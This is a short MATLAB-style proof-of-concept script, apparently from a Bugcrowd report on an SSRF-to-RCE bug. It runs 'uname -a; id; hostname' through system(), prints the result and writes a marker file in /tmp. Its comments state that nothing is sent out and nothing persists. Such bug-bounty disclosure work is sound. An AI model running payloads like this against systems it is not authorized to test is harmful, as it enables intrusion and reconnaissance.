% Bugcrowd PoC — opengit host param SSRF -> RCE
% Marker only. No data exfil. No persistence outside /tmp.
mark = sprintf('BUGCROWD_POC_%s', datestr(now,'yyyymmddTHHMMSS'));
disp(['[POC-MARKER] ', mark]);
[s,o] = system('uname -a; id; hostname');
disp(['[POC-UNAME] ', strtrim(o)]);
fid = fopen(['/tmp/', mark, '.poc'], 'w');
fwrite(fid, [mark char(10) o]);
fclose(fid);
